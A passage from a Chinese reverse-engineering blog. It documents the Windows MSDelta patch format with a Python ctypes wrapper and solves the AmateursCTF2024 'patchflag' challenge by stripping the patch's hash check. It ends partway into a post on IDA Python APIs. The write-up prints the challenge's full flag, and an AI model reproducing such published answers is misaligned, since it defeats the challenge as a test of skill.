<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">HANDLE = ctypes.c_void_p</span><br><span class="line">HMODULE = HANDLE</span><br><span class="line">LPCSTR = LPSTR = ctypes.c_char_p</span><br><span class="line">BOOL = ctypes.c_long</span><br><span class="line">BYTE = ctypes.c_ubyte</span><br><span class="line">SIZE_T = ctypes.c_size_t</span><br><span class="line">DWORD = ctypes.c_ulong</span><br><span class="line">ULONG = ctypes.c_ulong</span><br><span class="line">ALG_ID = ctypes.c_ulong</span><br><span class="line">LPBUFFER = ctypes.POINTER(ctypes.c_char)</span><br><span class="line"></span><br><span class="line"><span class="comment"># this is the Win32 Epoch time for when Unix Epoch time started. It is in</span></span><br><span class="line"><span class="comment"># hundreds of nanoseconds.</span></span><br><span class="line">EPOCH_AS_FILETIME = <span class="number">116444736000000000</span></span><br><span class="line"><span class="comment"># This is the divider/multiplier for converting nanoseconds to</span></span><br><span class="line"><span class="comment"># seconds and vice versa</span></span><br><span class="line">HUNDREDS_OF_NANOSECONDS = <span class="number">10000000</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FILETIME</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [(<span class="string">&quot;dwLowDateTime&quot;</span>, DWORD),</span><br><span class="line">                (<span class="string">&quot;dwHighDateTime&quot;</span>, DWORD)]</span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">unix_epoch_seconds</span>(<span class="params">self</span>):</span><br><span class="line">        val = (self.dwHighDateTime &lt;&lt; <span class="number">32</span>) + self.dwLowDateTime</span><br><span class="line">        <span class="keyword">return</span> (val - EPOCH_AS_FILETIME) / HUNDREDS_OF_NANOSECONDS</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        dt = datetime.datetime.utcfromtimestamp(self.unix_epoch_seconds)</span><br><span class="line">        <span class="keyword">return</span> dt.strftime(<span class="string">&#x27;%c&#x27;</span>)</span><br><span class="line">_FILETIME = FILETIME</span><br><span class="line">PFILETIME = ctypes.POINTER(_FILETIME)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">RaiseIfZero</span>(<span class="params">result, func = <span class="literal">None</span>, arguments = (<span class="params"></span>)</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> result:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># HMODULE WINAPI LoadLibrary(</span></span><br><span class="line"><span class="comment">#   _In_ LPCTSTR lpFileName</span></span><br><span class="line"><span class="comment"># );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">LoadLibrary</span>(<span class="params">dll</span>):</span><br><span class="line">    _LoadLibraryA = ctypes.windll.kernel32.LoadLibraryA</span><br><span class="line">    _LoadLibraryA.argtypes = [LPSTR]</span><br><span class="line">    _LoadLibraryA.restype = HMODULE</span><br><span class="line">    _LoadLibraryA.errcheck = RaiseIfZero</span><br><span class="line">    <span class="keyword">return</span> _LoadLibraryA(dll)</span><br><span class="line"></span><br><span class="line">DELTA_FLAG_TYPE = ctypes.c_ulonglong</span><br><span class="line">DELTA_FILE_TYPE = ctypes.c_ulonglong</span><br><span class="line">DELTA_FLAG_NONE = <span class="number">0</span></span><br><span class="line">DELTA_APPLY_FLAG_ALLOW_PA19 = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">DELTA_MAX_HASH_SIZE = <span class="number">32</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_HASH</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;HashSize&quot;</span>, DWORD),</span><br><span class="line">        (<span class="string">&quot;HashValue&quot;</span>, BYTE * DELTA_MAX_HASH_SIZE)</span><br><span class="line">        ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_HEADER_INFO</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;FileTypeSet&quot;</span>, DELTA_FILE_TYPE),</span><br><span class="line">        (<span class="string">&quot;FileType&quot;</span>, DELTA_FILE_TYPE),</span><br><span class="line">        (<span class="string">&quot;Flags&quot;</span>, DELTA_FILE_TYPE),</span><br><span class="line">        (<span class="string">&quot;TargetSize&quot;</span>, SIZE_T),</span><br><span class="line">        (<span class="string">&quot;TargetFileTime&quot;</span>, FILETIME),</span><br><span class="line">        (<span class="string">&quot;TargetHashAlgId&quot;</span>, ALG_ID),</span><br><span class="line">        (<span class="string">&quot;TargetHash&quot;</span>, DELTA_HASH),</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__str__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;\n&#x27;</span>.join([</span><br><span class="line">            <span class="string">&quot;[+] FileTypeSet     : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.FileTypeSet),</span><br><span class="line">            <span class="string">&quot;[+] FileType        : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.FileType),</span><br><span class="line">            <span class="string">&quot;[+] Flags           : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.Flags),</span><br><span class="line">            <span class="string">&quot;[+] TargetSize      : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.TargetSize),</span><br><span class="line">            <span class="string">&quot;[+] TargetFileTime  : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(self.TargetFileTime)),</span><br><span class="line">            <span class="string">&quot;[+] TargetHashAlgId : 0x&#123;0:X&#125;&quot;</span>.<span class="built_in">format</span>(self.TargetHashAlgId),</span><br><span class="line">            <span class="string">&quot;[+] TargetHash      : &#123;0&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;&quot;</span>.join(<span class="string">&quot;&#123;0:02X&#125;&quot;</span>.<span class="built_in">format</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> self.TargetHash.HashValue[:self.TargetHash.HashSize])),</span><br><span class="line">        ])</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_INPUT</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;lpStart&quot;</span>, LPBUFFER),</span><br><span class="line">        (<span class="string">&quot;uSize&quot;</span>, ULONG),</span><br><span class="line">        (<span class="string">&quot;Editable&quot;</span>, BOOL)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">DELTA_OUTPUT</span>(ctypes.Structure):</span><br><span class="line">    _fields_ = [</span><br><span class="line">        (<span class="string">&quot;lpStart&quot;</span>, LPBUFFER),</span><br><span class="line">        (<span class="string">&quot;uSize&quot;</span>, ULONG)]</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#BOOL  WINAPI  ApplyDeltaB(</span></span><br><span class="line"><span class="comment">#    DELTA_FLAG_TYPE  ApplyFlags,</span></span><br><span class="line"><span class="comment">#    DELTA_INPUT      Source,</span></span><br><span class="line"><span class="comment">#    c      Delta,</span></span><br><span class="line"><span class="comment">#    LPDELTA_OUTPUT   lpTarget</span></span><br><span class="line"><span class="comment">#   );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ApplyDeltaB</span>(<span class="params">source, delta, flags=DELTA_APPLY_FLAG_ALLOW_PA19</span>):</span><br><span class="line">    _ApplyDeltaB = ctypes.windll.msdelta.ApplyDeltaB</span><br><span class="line">    _ApplyDeltaB.argtypes = [DELTA_FLAG_TYPE, DELTA_INPUT, DELTA_INPUT, ctypes.POINTER(DELTA_OUTPUT)]</span><br><span class="line">    _ApplyDeltaB.restype = BOOL</span><br><span class="line">    _ApplyDeltaB.errcheck = RaiseIfZero</span><br><span class="line">    dsource = DELTA_INPUT()</span><br><span class="line">    dsource.lpStart = ctypes.create_string_buffer(source)</span><br><span class="line">    dsource.uSize = <span class="built_in">len</span>(source)</span><br><span class="line">    dsource.Editable = <span class="literal">False</span></span><br><span class="line">    ddelta = DELTA_INPUT()</span><br><span class="line">    ddelta.lpStart = ctypes.create_string_buffer(delta)</span><br><span class="line">    ddelta.uSize = <span class="built_in">len</span>(delta)</span><br><span class="line">    ddelta.Editable = <span class="literal">False</span></span><br><span class="line">    out = DELTA_OUTPUT()</span><br><span class="line">    _ApplyDeltaB(flags, dsource, ddelta, ctypes.byref(out))</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#BOOL  WINAPI  GetDeltaInfoA(</span></span><br><span class="line"><span class="comment">#    LPCSTR               lpDeltaName,</span></span><br><span class="line"><span class="comment">#    LPDELTA_HEADER_INFO  lpHeaderInfo</span></span><br><span class="line"><span class="comment">#    );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Note: This doesn&#x27;t work with file distributed inside KB as there is a</span></span><br><span class="line"><span class="comment"># checksum at the start of the file</span></span><br><span class="line"><span class="comment"># msdelta!compo::CheckBuffersIdentityFactory::CheckBuffersIdentityComponent::InternalProcess+0x84:</span></span><br><span class="line"><span class="comment"># 00007ffe`8d4d6894 e8aa5b0300      call    msdelta!memcmp (00007ffe`8d50c443)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetDeltaInfo</span>(<span class="params">delta</span>):</span><br><span class="line">    _GetDeltaInfoA = ctypes.windll.msdelta.GetDeltaInfoA</span><br><span class="line">    _GetDeltaInfoA.argtypes = [LPCSTR, ctypes.POINTER(DELTA_HEADER_INFO)]</span><br><span class="line">    _GetDeltaInfoA.restype = BOOL</span><br><span class="line">    _GetDeltaInfoA.errcheck = RaiseIfZero</span><br><span class="line">    info = DELTA_HEADER_INFO()</span><br><span class="line">    _GetDeltaInfoA(delta, ctypes.byref(info))</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># BOOL  WINAPI  GetDeltaInfoB(</span></span><br><span class="line"><span class="comment">#     DELTA_INPUT          Delta,</span></span><br><span class="line"><span class="comment">#     LPDELTA_HEADER_INFO  lpHeaderInfo</span></span><br><span class="line"><span class="comment">#     );</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GetDeltaInfoB</span>(<span class="params">source</span>):</span><br><span class="line">    _GetDeltaInfoB = ctypes.windll.msdelta.GetDeltaInfoB</span><br><span class="line">    _GetDeltaInfoB.argtypes = [DELTA_INPUT, ctypes.POINTER(DELTA_HEADER_INFO)]</span><br><span class="line">    _GetDeltaInfoB.restype = BOOL</span><br><span class="line">    _GetDeltaInfoB.errcheck = RaiseIfZero</span><br><span class="line">    <span class="built_in">input</span> = DELTA_INPUT()</span><br><span class="line">    <span class="built_in">input</span>.lpStart = ctypes.create_string_buffer(source)</span><br><span class="line">    <span class="built_in">input</span>.uSize = <span class="built_in">len</span>(source)</span><br><span class="line">    <span class="built_in">input</span>.Editable = <span class="literal">False</span></span><br><span class="line">    info = DELTA_HEADER_INFO()</span><br><span class="line">    _GetDeltaInfoB(<span class="built_in">input</span>, ctypes.byref(info))</span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_delta_info</span>(<span class="params">source</span>):</span><br><span class="line">    buf = <span class="built_in">open</span>(source, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    buf = buf[<span class="number">4</span>:] <span class="comment"># remove CRC</span></span><br><span class="line">    x = GetDeltaInfoB(buf)</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">apply_delta</span>(<span class="params">source, delta, outfile</span>):</span><br><span class="line">    bufs = <span class="built_in">open</span>(source, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    bufd = <span class="built_in">open</span>(delta, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">    bufd = bufd[<span class="number">4</span>:] <span class="comment"># remove CRC</span></span><br><span class="line">    out = ApplyDeltaB(bufs, bufd)</span><br><span class="line">    <span class="built_in">open</span>(outfile, <span class="string">&quot;wb&quot;</span>).write(out.lpStart[:out.uSize])</span><br><span class="line"></span><br><span class="line">LoadLibrary(<span class="string">b&quot;msdelta.dll&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;MSdelta patch applier&quot;</span>)</span><br><span class="line">    ACTIONS = [<span class="string">&quot;info&quot;</span>, <span class="string">&quot;apply&quot;</span>]</span><br><span class="line">    actions = parser.add_subparsers(<span class="built_in">help</span>=<span class="string">&quot;Action to perform: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;,&quot;</span>.join(ACTIONS)), dest=<span class="string">&quot;action&quot;</span>)</span><br><span class="line">    info = actions.add_parser(<span class="string">&quot;info&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Print delta patch information&quot;</span>)</span><br><span class="line">    info.add_argument(<span class="string">&quot;delta_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;delta patch file&quot;</span>)</span><br><span class="line">    apply = actions.add_parser(<span class="string">&quot;apply&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;Apply delta patch&quot;</span>)</span><br><span class="line">    apply.add_argument(<span class="string">&quot;delta_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;delta patch file&quot;</span>)</span><br><span class="line">    apply.add_argument(<span class="string">&quot;input_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;input file&quot;</span>)</span><br><span class="line">    apply.add_argument(<span class="string">&quot;output_file&quot;</span>, action=<span class="string">&quot;store&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">help</span>=<span class="string">&quot;output file&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.action == <span class="string">&quot;info&quot;</span>:</span><br><span class="line">        info = get_delta_info(args.delta_file)</span><br><span class="line">        <span class="built_in">print</span>(info)</span><br><span class="line">    <span class="keyword">elif</span> args.action == <span class="string">&quot;apply&quot;</span>:</span><br><span class="line">        apply_delta(args.input_file, args.delta_file, args.output_file)</span><br></pre></td></tr></table></figure>

<h2 id="打补丁"><a href="#打补丁" class="headerlink" title="打补丁"></a>打补丁</h2><p>由于官方没有给出patch过程的技术细节 我也没逆清楚( 所以就归纳一下多次尝试得出的有关patch过程的结论:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">补丁作用于源文件得到的目标文件是固定不变的</span><br><span class="line">1.若源文件和目标文件中有一个为空则这个补丁可以作用于任何一个另外提供的源文件</span><br><span class="line">2.若源文件和目标文件均不为空时 补丁必须作用于除了有差异的位置以外和目标文件完全一致的源文件 </span><br><span class="line">    e.g.</span><br><span class="line">    delta &lt;= from b&#x27;unpatch&#x27; to b&#x27;__patched&#x27;</span><br><span class="line">    delta can be applied to any Source b&#x27;??patch??&#x27;(? for any)</span><br></pre></td></tr></table></figure>

<p>如果不满足这些条件 根据调用规定ApplyDelta API在返回后在RAX中存放错误码 比较常见的是<code>0xD:无效补丁</code> 至于无效补丁的成因 先说明补丁包含的内容中哪些对打补丁的结果有作用</p>
<p>以AmateursCTF2024的一道题为例:</p>
<h3 id="AmateursCTF2024-rev-patchflag"><a href="#AmateursCTF2024-rev-patchflag" class="headerlink" title="AmateursCTF2024&#x2F;rev&#x2F;patchflag"></a>AmateursCTF2024&#x2F;rev&#x2F;patchflag</h3><p>题目的要求就是成功利用给出的补丁 dump出这个补丁:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-232710.png" alt="image-20240428232703227"></p>
<p>正常的补丁开头的4bytes是补丁的CRC32 题目给出的补丁抹去了这个信息 <code>PA30</code>是生成补丁的标准 但是这两个内容不影响补丁结果 这里直接插入4bytes的0得到补丁的信息:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-233021.png" alt="image-20240428233021811"></p>
<p>还有两个不影响打补丁的内容(小端序) 分别标志了两个时间:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-233218.png" alt="image-20240428233218208"></p>
<p>后续的一个字<code>0x23 18</code>用处暂不明确 再后续一个字<code>0x8 36 8</code> [:4]与校验结果使用的hash算法有关 下文会给出说明 [4:24]是目标文件的字节长度 [24:]不确定详细含义 但是与生成补丁时的选项标志位有关</p>
<p>接下来的一个字<code>0x8004</code>为校验使用的<a href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id">hash算法ID</a> 根据实验其只支持md系列算法以及文档中给出的两种特殊标志:</p>
<p><img src="https://cdn.jsdelivr.net/gh/1K0CT/BlogImage@main/img/2024/04/28/20240428-234442.png" alt="image-20240428234442506"></p>
<p>所使用的hash校验算法会影响上面说的4位标志位 已经试出来的有:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.当使用md系列hash时     flag = 0b1000</span><br><span class="line">2.使用CRC32时          flag = 0b0010</span><br><span class="line">3.不进行hash校验时    flag = 0b0001</span><br></pre></td></tr></table></figure>

<p>再接下来的一个字猜测与hash的结果长度有关 这些字节都会影响打补丁的失败与否 接下来的<code>hash_size</code>个字节为预期目标文件的hash校验码 进行补丁后需要计算结果hash与这个hash进行对比 如果校验失败则返回0xD错误码 后续的字节就是经过压缩的差异信息</p>
<p>对于这一题 hash校验值明显已经被魔改 可以再次魔改补丁让其不进行hash校验:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> test <span class="keyword">import</span> get_patch_info</span><br><span class="line"><span class="keyword">from</span> delta_patch <span class="keyword">import</span> apply_patch_to_buffer</span><br><span class="line"></span><br><span class="line">patch = <span class="built_in">bytes</span>([<span class="number">0x50</span>, <span class="number">0x41</span>, <span class="number">0x33</span>, <span class="number">0x30</span>, <span class="number">0xC0</span>, <span class="number">0x08</span>, <span class="number">0x97</span>, <span class="number">0xFC</span>, <span class="number">0xFD</span>, <span class="number">0x3C</span>, </span><br><span class="line">  <span class="number">0xDA</span>, <span class="number">0x01</span>, <span class="number">0x18</span>, <span class="number">0x23</span>, <span class="number">0x68</span>, <span class="number">0x83</span>, <span class="number">0x04</span>, <span class="number">0x80</span>, <span class="number">0x52</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x6C</span>, <span class="number">0x61</span>, <span class="number">0x72</span>, <span class="number">0x72</span>, <span class="number">0x79</span>, <span class="number">0x2D</span>, <span class="number">0x6B</span>, <span class="number">0x69</span>, <span class="number">0x6C</span>, <span class="number">0x6C</span>, </span><br><span class="line">  <span class="number">0x65</span>, <span class="number">0x64</span>, <span class="number">0x2D</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x73</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, <span class="number">0x21</span>, </span><br><span class="line">  <span class="number">0x01</span>, <span class="number">0xCA</span>, <span class="number">0x00</span>, <span class="number">0xB7</span>, <span class="number">0x03</span>, <span class="number">0x88</span>, <span class="number">0x69</span>, <span class="number">0xB3</span>, <span class="number">0xFA</span>, <span class="number">0xF4</span>, </span><br><span class="line">  <span class="number">0x89</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0xDD</span>, <span class="number">0x8C</span>, <span class="number">0x01</span>, <span class="number">0xD1</span>, <span class="number">0xDA</span>, <span class="number">0x4D</span>, <span class="number">0x88</span>, </span><br><span class="line">  <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0x4C</span>, <span class="number">0xBB</span>, <span class="number">0x71</span>, <span class="number">0x7D</span>, <span class="number">0xDA</span>, <span class="number">0x75</span>, <span class="number">0x6A</span>, <span class="number">0x37</span>, </span><br><span class="line">  <span class="number">0x2A</span>, <span class="number">0xD2</span>, <span class="number">0x88</span>, <span class="number">0x11</span>, <span class="number">0x91</span>, <span class="number">0x22</span>, <span class="number">0x4E</span>, <span class="number">0x66</span>, <span class="number">0xDE</span>, <span class="number">0xA0</span>, </span><br><span class="line">  <span class="number">0x31</span>, <span class="number">0x3D</span>, <span class="number">0x22</span>, <span class="number">0xCC</span>, <span class="number">0x9B</span>, <span class="number">0xD6</span>, <span class="number">0xAE</span>, <span class="number">0x47</span>, <span class="number">0xB4</span>, <span class="number">0x39</span>, </span><br><span class="line">  <span class="number">0xB1</span>, <span class="number">0x56</span>, <span class="number">0x01</span>])</span><br><span class="line"></span><br><span class="line">buf = <span class="string">b&quot;amateursCTF&#123;&quot;</span> + <span class="string">b&quot;_&quot;</span> * <span class="number">41</span> + <span class="string">b&quot;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    out = apply_patch_to_buffer(patch, buf)</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line">info = get_patch_info(patch)</span><br><span class="line">hexinfo = []</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> info:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        hexinfo.append(<span class="built_in">hex</span>(x))</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        hexinfo.append(x)</span><br><span class="line"></span><br><span class="line">newheader = patch[:<span class="number">14</span>] + <span class="string">b&#x27;h\x13\x02&#x27;</span> + patch[<span class="number">16</span> + <span class="number">4</span> + <span class="number">0x14</span>:]</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    out = apply_patch_to_buffer(buf, newheader)</span><br><span class="line">    <span class="built_in">print</span>(out)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(e)</span><br><span class="line"><span class="comment"># Patch file is invalid</span></span><br><span class="line"><span class="comment"># b&#x27;amateursCTF&#123;suff3r_th3_p41n_of_a_m1ll10n_wind0ws_d3v5&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>另外一个方法就是在获取目标hash值(<code>compo::PullcapiContext::GetHash</code>)前获取到目标字节流</p>
]]></content>
      <categories>
        <category>Windows内核</category>
      </categories>
      <tags>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>IDAapi学习</title>
    <url>/2024/09/05/IDAapi%E5%AD%A6%E4%B9%A0/</url>
    <content><![CDATA[<p>Angr的力量是有极限的 所以我要转行学idaapi了!</p>
<span id="more"></span>

<h2 id="获取二进制文件信息"><a href="#获取二进制文件信息" class="headerlink" title="获取二进制文件信息"></a>获取二进制文件信息</h2><h3 id="获取硬件信息"><a href="#获取硬件信息" class="headerlink" title="获取硬件信息"></a>获取硬件信息</h3><h4 id="inf-is-64bit-bool-inf-is-32bit-exactly-bool"><a href="#inf-is-64bit-bool-inf-is-32bit-exactly-bool" class="headerlink" title="inf_is_64bit() -&gt; bool | inf_is_32bit_exactly() -&gt; bool"></a>inf_is_64bit() -&gt; bool | inf_is_32bit_exactly() -&gt; bool</h4><p>判断当前IDA打开的二进制文件是64位或32位的</p>
<h4 id="inf-is-be-bool"><a href="#inf-is-be-bool" class="headerlink" title="inf_is_be() -&gt; bool"></a>inf_is_be() -&gt; bool</h4><p>判断当前程序的模式是大端序(返回 True)或是小端序</p>
<h4 id="inf-get-procname-lower-str"><a href="#inf-get-procname-lower-str" class="headerlink" title="inf_get_procname()[.lower()] -&gt; str"></a>inf_get_procname()[.lower()] -&gt; str</h4><p>返回程序框架名</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">     == <span class="string">&#x27;metapc&#x27;</span>            : <span class="string">&#x27;ARCH_X86&#x27;</span>,</span><br><span class="line">    .startswith(<span class="string">&#x27;arm&#x27;</span>)        : [<span class="string">&#x27;ARCH_ARM64&#x27;</span>, <span class="string">&#x27;ARCH_ARM&#x27;</span>],</span><br><span class="line">    .startswith(<span class="string">&#x27;sparc&#x27;</span>)    : <span class="string">&#x27;ARCH_SPARC&#x27;</span>,</span><br><span class="line">    .startswith(<span class="string">&#x27;ppc&#x27;</span>)        : <span class="string">&#x27;ARCH_PPC&#x27;</span></span><br><span class="line">    .startswith(<span class="string">&#x27;mips&#x27;</span>)        : <span class="string">&#x27;ARCH_MIPS&#x27;</span></span><br><span class="line">    .startswith(<span class="string">&#x27;systemz&#x27;</span>)    : <span class="string">&#x27;ARCH_SYSTEMZ&#x27;</span></span><br><span class="line">    .startswith(<span class="string">&#x27;s390x&#x27;</span>)    : <span class="string">&#x27;ARCH_SYSTEMZ&#x27;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="idc-get-sreg-ea-reg-int"><a href="#idc-get-sreg-ea-reg-int" class="headerlink" title="idc.get_sreg(ea, reg) -&gt; int"></a>idc.get_sreg(ea, reg) -&gt; int</h4><p>Thumb模式下在用户代码段处的第20个段寄存器存放的值是 1 通过这个可以判断当前ARM框架下的模式是否是Thumb模式:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">is_thumb</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="keyword">return</span> idc.get_sreg(address, <span class="string">&#x27;T&#x27;</span>) == <span class="number">1</span></span><br><span class="line"><span class="comment"># idc中获取寄存器可以使用字母代表 这里将&#x27;A&#x27;转化为0 则&#x27;T&#x27;转化为20</span></span><br><span class="line"><span class="comment"># &lt;=&gt;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">is_thumb</span>(<span class="params">address</span>):</span><br><span class="line">    <span class="keyword">return</span> idaapi.get_sreg(address, <span class="number">20</span>) == <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h3 id="获取内存信息"><a href="#获取内存信息" class="headerlink" title="获取内存信息"></a>获取内存信息</h3><h4 id="is-mapped-ea-bool"><a href="#is-mapped-ea-bool" class="headerlink" title="is_mapped(ea) -&gt; bool"></a>is_mapped(ea) -&gt; bool</h4><p>判断地址ea是否是有效地址(在程序内)</p>
<h4 id="get-bytes-ea-size-gmb-flags-0x01-bytes-get-wide-byte-ea-int"><a href="#get-bytes-ea-size-gmb-flags-0x01-bytes-get-wide-byte-ea-int" class="headerlink" title="get_bytes(ea, size[, gmb_flags&#x3D;0x01]) -&gt; bytes | get_wide_byte(ea) -&gt; int"></a>get_bytes(ea, size[, gmb_flags&#x3D;0x01]) -&gt; bytes | get_wide_byte(ea) -&gt; int</h4><p>分别用来以大端序获取位于地址ea处的size个字节数据和1个字节的数据 除此之外还有包括获取1字 双字等的函数 但是这两个应该够用了</p>
<h5 id="2024-长城杯-tmaze"><a href="#2024-长城杯-tmaze" class="headerlink" title="[2024 长城杯] tmaze"></a>[2024 长城杯] tmaze</h5><p>主函数:</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *in; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v5; <span class="comment">// eax</span></span><br><span class="line">  __int64 v6; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdi</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// eax</span></span><br><span class="line">  __int64 v9; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">bool</span> v12; <span class="comment">// al</span></span><br><span class="line">  __int64 *v13; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> step; <span class="comment">// ebx</span></span><br><span class="line">  __int64 *<span class="built_in">map</span>; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">size_t</span> _step; <span class="comment">// r15</span></span><br><span class="line">  <span class="type">size_t</span> len; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> now; <span class="comment">// edx</span></span><br><span class="line">  __int64 v19; <span class="comment">// r14</span></span><br><span class="line"></span><br><span class="line">  in = argv[<span class="number">1</span>];</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">do</span></span><br><span class="line">    v6 = v5++;</span><br><span class="line">  <span class="keyword">while</span> ( in[v6] );</span><br><span class="line">  <span class="keyword">if</span> ( v5 